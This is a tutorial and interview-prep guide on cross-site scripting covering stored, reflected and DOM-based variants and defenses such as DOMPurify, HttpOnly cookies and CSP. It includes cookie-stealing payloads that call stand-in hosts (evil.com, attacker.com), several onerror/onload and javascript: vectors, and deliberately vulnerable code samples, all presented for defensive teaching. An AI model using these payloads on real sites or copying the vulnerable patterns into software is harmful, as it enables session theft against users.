# Cross-Site Scripting (XSS): Stored, Reflected, DOM-Based, and Sanitization

## 1. What is it?
**Cross-Site Scripting (XSS)** is a client-side code injection vulnerability that occurs when a web application includes untrusted user data in an HTML web page without proper validation, escaping, or sanitization. 

When a victim's browser loads the compromised page, it cannot distinguish between legitimate application scripts and the injected malicious code. The browser executes the attacker's payload (typically JavaScript) within the security context of the victim's session.

XSS is categorized into three distinct variants:
1. **Stored (Persistent) XSS**: The malicious script is permanently stored in the database (e.g., in a comment or profile bio) and served to every user who visits that page.
2. **Reflected (Non-Persistent) XSS**: The payload is embedded in a malicious URL link (e.g., search query parameter) and immediately reflected off the server response.
3. **DOM-Based XSS**: The vulnerability exists entirely on the client side in JavaScript; the payload is read from a DOM sink (like `window.location.hash`) and executed without ever touching the server.

```
XSS Execution Lifecycle:
Attacker submits: <script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>
                                     |
                                     v
Server stores payload in Database (Stored XSS) OR reflects in URL (Reflected XSS)
                                     |
                                     v
Victim visits page ---> Browser parses HTML ---> Executes <script> in victim's session
                                     |
                                     v
Attacker receives: Session Tokens, Stolen Passwords, or executes actions on victim's behalf!
```

---

## 2. Why does it exist?
1. **The Dual Nature of Web Browsers**: Browsers interpret HTML as a mixture of structural layout tags and executable JavaScript instructions. If user data is rendered using unsafe browser APIs (like `innerHTML` or React's `dangerouslySetInnerHTML`), the browser treats user-supplied text as executable DOM markup.
2. **The Lure of Rich-Text Content**: Modern applications (blogs, CMS, markdown editors, email clients) allow users to submit styled HTML (bold text, images, hyperlinks). Parsing rich text without an industrial-grade HTML sanitizer allows attackers to smuggle payload vectors inside obscure tags (`<img src=x onerror=alert(1)>` or `<svg onload=alert(1)>`).
3. **Cookie Misconfigurations**: If authentication session tokens are stored in `localStorage` or in cookies lacking the **`HttpOnly`** flag, any XSS vulnerability can extract the session token in a single line of JavaScript (`document.cookie`), leading to instant account takeover.

---

## 3. Mental Model
Think of XSS as **A Trojan Horse Delivered by the Postal Service**:
- Your web browser is a king who trusts royal decrees delivered by the town mailman (**The Web Server**).
- An attacker writes a malicious proclamation: *"Guards, empty the royal treasury into the attacker's cart."*
- If the mailman simply slips the proclamation into the official royal envelope without inspecting it, the king opens the envelope, sees the official royal seal, assumes the king's advisor wrote it, and orders the guards to empty the treasury (**Session Hijacking**).
- **Context-Aware Escaping**: The advisor translates the proclamation into harmless display text: `&lt;script&gt;`. The king reads the words as a storybook tale, and no guards move.
- **`HttpOnly` Cookies**: Storing the crown jewels in an underground subterranean vault that can only be accessed by the mail boat (**HTTP wire protocol**), which the king's palace guards (**JavaScript DOM**) are physically forbidden from touching.

---

## 4. Basic Example
Demonstrating the three XSS variants and safe rendering in React:

```typescript
// 1. REFLECTED XSS (Server reflects query param into HTML without escaping)
// URL: https://site.com/search?q=<script>alert('XSS')</script>
app.get('/search', (req, res) => {
  // VULNERABLE: Direct string concatenation into HTML
  res.send(`<h1>Results for: ${req.query.q}</h1>`);
});

// 2. DOM-BASED XSS (Client JavaScript writes raw URL parameter to innerHTML)
// VULNERABLE Client-Side Code:
const query = new URLSearchParams(window.location.search).get('name');
document.getElementById('welcome-banner')!.innerHTML = `Hello, ${query}!`;

// 3. REACT SAFE RENDERING (Default behavior auto-escapes text)
function SafeUserProfile({ userBio }: { userBio: string }) {
  // SECURE: React automatically escapes strings inside JSX tags!
  // If userBio is "<script>alert(1)</script>", React renders it as harmless plain text!
  return <div className="user-bio">{userBio}</div>;
}

// 4. REACT DANGEROUS ESCAPE HATCH (Re-introduces XSS!)
function VulnerableRichText({ untrustedHtml }: { untrustedHtml: string }) {
  // DANGEROUS: Bypasses React's automatic escaping!
  return <div dangerouslySetInnerHTML={{ __html: untrustedHtml }} />;
}
```

---

## 5. Real Example: Industrial HTML Sanitization using DOMPurify in TypeScript
A production TypeScript rich-text processing service demonstrating safe HTML sanitization on both client and Node.js server environments:

```typescript
import DOMPurify from 'isomorphic-dompurify';

export class RichTextSanitizer {
  /**
   * SANITIZE USER-SUPPLIED RICH TEXT HTML
   * Strips all dangerous tags (<script>, <iframe>, <object>, <embed>) 
   * and inline event handlers (onload, onerror, onclick, onmouseover).
   */
  public static sanitizeHtml(dirtyHtml: string): string {
    const cleanHtml = DOMPurify.sanitize(dirtyHtml, {
      // Whitelist only safe formatting tags
      ALLOWED_TAGS: [
        'b', 'i', 'em', 'strong', 'a', 'p', 'h1', 'h2', 'h3', 
        'ul', 'ol', 'li', 'blockquote', 'code', 'pre', 'img'
      ],
      // Whitelist only harmless attributes
      ALLOWED_ATTR: ['href', 'title', 'alt', 'src', 'width', 'height', 'target'],
      // Enforce protocol safety on links
      ALLOWED_URI_REGEXP: /^(?:(?:(?:f|ht)tps?|mailto):|[^a-z]|[a-z+.\-]+(?:[^a-z+.\-:]|$))/i,
      // Automatically add rel="noopener noreferrer" to external links
      ADD_ATTR: ['rel']
    });

    return cleanHtml;
  }
}

// REACT COMPONENT CONSUMING SANITIZED HTML
export function SafeBlogContent({ rawMarkdownHtml }: { rawMarkdownHtml: string }) {
  const sanitizedContent = RichTextSanitizer.sanitizeHtml(rawMarkdownHtml);

  return (
    <article 
      className="prose"
      dangerouslySetInnerHTML={{ __html: sanitizedContent }} 
    />
  );
}
```

---

## 6. Under the Hood

### 1. The Anatomy of XSS Payload Execution
How do attackers execute JavaScript without `<script>` tags?
Modern browsers parse HTML permissively. Attackers leverage HTML5 media tags and SVG elements that execute JavaScript on error or load events:
```html
<!-- Vector 1: Image loading error event handler -->
<img src="invalid_image.jpg" onerror="fetch('https://attacker.com/steal?c='+document.cookie)" />

<!-- Vector 2: SVG vector onload -->
<svg onload="alert(document.domain)"></svg>

<!-- Vector 3: JavaScript pseudo-protocol in hyperlinks -->
<a href="javascript:alert(document.cookie)">Click to view prize</a>

<!-- Vector 4: Autofocus event trigger -->
<input autofocus onfocus="alert(1)">
```

### 2. Context-Aware Output Escaping
Escaping is not one-size-fits-all; escaping depends on the **DOM Execution Context**:
- **HTML Body Context**: `&` $\to$ `&amp;`, `<` $\to$ `&lt;`, `>` $\to$ `&gt;`.
- **HTML Attribute Context**: `"` $\to$ `&quot;`, `'` $\to$ `&#x27;`.
- **JavaScript Context**: Inside `<script>var name = "USER_INPUT";</script>`, HTML escaping is useless! An attacker sends `"; alert(1); //`. You must use JSON serialization (`JSON.stringify()`) or hex unicode escaping.
- **URI Context**: In `<a href="USER_INPUT">`, an attacker injects `javascript:evil()`. You must validate that the protocol is strictly `http:` or `https:`.

---

## 7. Important Rules
1. **Never Store Authentication Tokens in `localStorage`**: `localStorage` is accessible by any JavaScript running in the browser. If an XSS vulnerability exists anywhere on your domain, the attacker can execute `localStorage.getItem('token')`. Always store session tokens in **`HttpOnly` Cookies**.
2. **Context-Aware Encoding is Mandatory**: Never invent custom string-replacement filters (`str.replace('<script>', '')`). Attackers bypass naive filters with `<SCRscriptIPT>` or `<img src=x onerror=...>`.
3. **Validate URLs Against Dangerous Protocols**: When rendering user-supplied links (`<a href={userWebsite}>`), always ensure the string starts with `https://` or `http://` to prevent `javascript:` execution.
4. **Deploy a Strict Content Security Policy (CSP)**: A strict CSP acts as an impenetrable second line of defense; even if an attacker injects `<script>`, the browser refuses to execute it.

---

## 8. Common Mistakes

### 1. The `javascript:` Protocol in Links (React Doesn't Escape This!)
```tsx
// VULNERABLE IN REACT:
// React automatically escapes HTML entities, BUT it does NOT sanitize href URLs!
// If userWebsite is "javascript:stealTokens()", clicking the link executes the script!
<a href={user.websiteUrl}>Visit Website</a>

// SECURE: Validate URL protocol explicitly
const isSafeUrl = /^https?:\/\//i.test(user.websiteUrl);
<a href={isSafeUrl ? user.websiteUrl : '#'}>Visit Website</a>
```

### 2. Unsafe DOM Sinks
Using vulnerable JavaScript sinks:
- `element.innerHTML = input;` (Vulnerable)
- `document.write(input);` (Vulnerable)
- `eval(input);` (Catastrophic)
- `element.textContent = input;` (**100% Safe**; treats input strictly as plain text).

---

## 9. Best Practices

### 1. Enforce `HttpOnly` on All Session Cookies
Instruct the browser that JavaScript is strictly prohibited from reading or copying the cookie:
```typescript
res.cookie('session_token', token, {
  httpOnly: true, // Prevents XSS script from accessing cookie via document.cookie
  secure: true,   // Transmitted only over encrypted HTTPS
  sameSite: 'lax' // Protects against CSRF
});
```

### 2. Hardened Content Security Policy (CSP)
Configure CSP headers using Helmet.js to disallow inline scripts (`'unsafe-inline'`):
```typescript
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'"], // Blocks all inline <script> and eval() executions!
      objectSrc: ["'none'"],
      upgradeInsecureRequests: []
    }
  })
);
```

---

## 10. Performance Considerations
- **DOMPurify Benchmarks**: Sanitizing a typical 5KB markdown article takes ~0.5ms in V8. Always sanitize on the **backend write path** (when saving to the database) rather than re-sanitizing on every single page load.

---

## 11. Security Considerations
- **DOM Clobbering**: An attacker injects named HTML elements (e.g., `<img id="config" src="evil.com">`) that overwrite global JavaScript variables (`window.config`), tricking client-side scripts into loading malicious dependencies. Use DOMPurify with the `SANITIZE_DOM: true` option.

---

## 12. Alternatives
1. **Markdown Rendering Engines (markdown-it / marked) with Sanitizer**: Convert user markdown into abstract syntax trees, stripping raw HTML tags entirely before emitting JSX elements.
2. **Text-Only Rendering**: For messaging apps, enforce plain text rendering using CSS `white-space: pre-wrap` and `textContent`.

---

## 13. Trade-offs

| Defense Layer | Primary Strength | Limitation |
| :--- | :--- | :--- |
| **`HttpOnly` Cookie Flag** | Completely prevents token theft | Does not stop attacker from acting on page |
| **React Auto-Escaping** | Automatic across JSX | Does not sanitize `href` attributes |
| **DOMPurify Sanitization** | Allows safe rich text HTML | CPU cost; must keep library updated |
| **Content Security Policy (CSP)**| Browser-level script execution block | Can break third-party marketing tags |

---

## 14. Real-World Usage
- **Samy Worm (MySpace)**: The most famous Stored XSS worm in history. Within 20 hours, a script injected into a user profile forced over 1 million users to friend "Samy" and replicated itself across their profiles.
- **Modern SaaS Comment Sections**: GitHub and Notion use strict DOMPurify pipelines and rigid CSP nonces to permit markdown formatting while eliminating XSS vectors.

---

## 15. Placement Interview Questions

### Basic
**Q: What is Cross-Site Scripting (XSS), and what are its three primary types?**  
*Answer*: XSS is a vulnerability where an attacker injects malicious client-side script into web pages viewed by other users. The three primary types are:
1. **Stored XSS**: The payload is permanently stored in the database and served to victims.
2. **Reflected XSS**: The payload is reflected off the server response via URL parameters or form inputs.
3. **DOM-Based XSS**: The payload is processed entirely in the browser's client-side JavaScript without server involvement.

### Conceptual
**Q: How does setting the `HttpOnly` flag on a cookie defend against XSS, and what does it NOT prevent?**  
*Answer*: Setting `HttpOnly` instructs the browser that the cookie **cannot be accessed by client-side JavaScript** (calling `document.cookie` returns an empty string or omits the cookie). This completely prevents an XSS script from stealing or exfiltrating the session token to an external attacker server. However, it **does not prevent the XSS script from executing actions inside the browser**; the attacker's script can still make authenticated requests (e.g., changing passwords or transferring funds) using standard `fetch()` calls because the browser automatically attaches `HttpOnly` cookies to outgoing requests.

### Implementation
**Q: React automatically escapes content rendered inside JSX tags. Can an application built entirely in React still be vulnerable to XSS? Give two specific examples.**  
*Answer*: Yes, React applications can still be vulnerable:
1. **Unsafe Href Attributes**: In `<a href={userUrl}>`, if `userUrl` is `"javascript:alert(1)"`, React does not escape the protocol, and clicking the link executes JavaScript.
2. **`dangerouslySetInnerHTML`**: If an application uses `<div dangerouslySetInnerHTML={{ __html: userInput }} />` without passing the input through an HTML sanitizer (like DOMPurify), injected scripts will execute directly.
3. **Direct DOM Manipulation**: Bypassing React via `ref` to set `element.current.innerHTML = userInput`.

### Debugging
**Q: A developer attempts to sanitize user input on the server by running `input.replace(/<script>/gi, '')`. Why is this filter fatally flawed?**  
*Answer*: This filter fails for several reasons:
1. **Non-Recursive Stripping**: An attacker submits `<scr<script>ipt>`, the inner `<script>` is removed, leaving the outer letters to form `<script>`, which executes!
2. **Alternative Tag Vectors**: XSS does not require `<script>` tags; attackers use `<img src=x onerror=alert(1)>`, `<svg onload=alert(1)>`, or `<body onload=alert(1)>`.
3. **Case and Whitespace Permutations**: Obscure spacing or null bytes can bypass naive regexes. Only industrial-grade context-aware sanitizers (DOMPurify) or encoding libraries should be used.

### Scenario
**Q: You are building a blog platform that allows users to write articles in Markdown. What is the secure architectural pipeline for converting user Markdown to rendered HTML?**  
*Answer*:
1. Parse the markdown text into an Abstract Syntax Tree (AST) using a parser like `marked` or `remark`.
2. Disable raw HTML parsing in the markdown compiler options (`html: false`).
3. Pass the generated HTML through **DOMPurify** with a strict whitelist of allowed tags (`p`, `b`, `i`, `h1`, `code`, `img`) and allowed attributes (`src`, `alt`, `href`).
4. Validate that all `href` and `src` attributes strictly match `https://` or `http://`.
5. Serve the page with a strict **Content Security Policy (CSP)** that forbids `'unsafe-inline'` script execution.

### Advanced
**Q: What is a "CSP Nonce", and how does it prevent inline XSS attacks while allowing legitimate inline scripts to execute?**  
*Answer*: A CSP Nonce is a **cryptographically secure random string generated uniquely for every single HTTP response** by the server. The server sends this nonce in the CSP header (`Content-Security-Policy: script-src 'nonce-R4nd0mStr1ng'`). Legitimate application scripts rendered by the server include this matching attribute: `<script nonce="R4nd0mStr1ng">`. When the browser parses the page, it executes only scripts that possess the exact matching nonce. If an attacker injects `<script>evil()</script>` via an XSS flaw, they cannot guess the random per-request nonce, and the browser refuses to execute the injected script.

---

## 16. Coding Questions

### Problem 1: Secure URL Sanitizer Component in React / TypeScript
Write a reusable React link component that strictly validates and sanitizes user-supplied URLs to prevent `javascript:` and `data:` protocol XSS exploits.

```tsx
import React from 'react';

interface SafeLinkProps extends React.AnchorHTMLAttributes<HTMLAnchorElement> {
  href: string;
  children: React.ReactNode;
}

export function SafeExternalLink({ href, children, ...props }: SafeLinkProps) {
  // Validate protocol
  const isSafeProtocol = (url: string): boolean => {
    try {
      // Parse URL (handles relative and absolute)
      const parsed = new URL(url, window.location.origin);
      // Strictly allow only http and https (blocks javascript:, data:, vbscript:)
      return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
      return false;
    }
  };

  const safeHref = isSafeProtocol(href) ? href : '#';

  return (
    <a
      href={safeHref}
      // Security best practice: Prevent reverse tab-nabbing
      target="_blank"
      rel="noopener noreferrer"
      {...props}
    >
      {children}
    </a>
  );
}
```

---

## 17. Common Interview Traps
- **Trap 1**: Thinking React makes you 100% immune to XSS. React auto-escapes text nodes, but leaves `href` and `dangerouslySetInnerHTML` vulnerable.
- **Trap 2**: Believing XSS can be prevented with a simple regex blacklist. Attackers have thousands of obscure browser parsing edge cases; blacklists always fail.
- **Trap 3**: Believing CSP replaces sanitization. CSP is a defense-in-depth barrier; it should complement input validation and output encoding, not replace them.

---

## 18. Revision Summary
- XSS injects malicious client-side scripts executed by victim browsers.
- Three types: **Stored** (database), **Reflected** (URL param), and **DOM-Based** (client-side JS sink).
- Primary defenses: Context-aware output encoding, **DOMPurify** for rich text, strict protocol checking on links, and **`HttpOnly` Cookies** to prevent session theft.
- Use **Content Security Policy (CSP)** to block unapproved script execution at the browser engine level.

---

## 19. Quick Reference

| Defense Mechanism | What It Protects | Implementation |
| :--- | :--- | :--- |
| **`HttpOnly` Cookie** | Prevents session token theft | `res.cookie('token', val, { httpOnly: true })` |
| **React Text Nodes** | Escapes HTML entities (`<` $\to$ `&lt;`)| Default JSX `{userText}` |
| **DOMPurify** | Sanitizes user rich text HTML | `DOMPurify.sanitize(dirtyHtml)` |
| **Protocol Validation** | Blocks `javascript:` XSS in links | Validate `parsed.protocol === 'https:'` |
| **Content Security Policy**| Blocks unauthorized script execution | Helmet.js `script-src 'self'` |
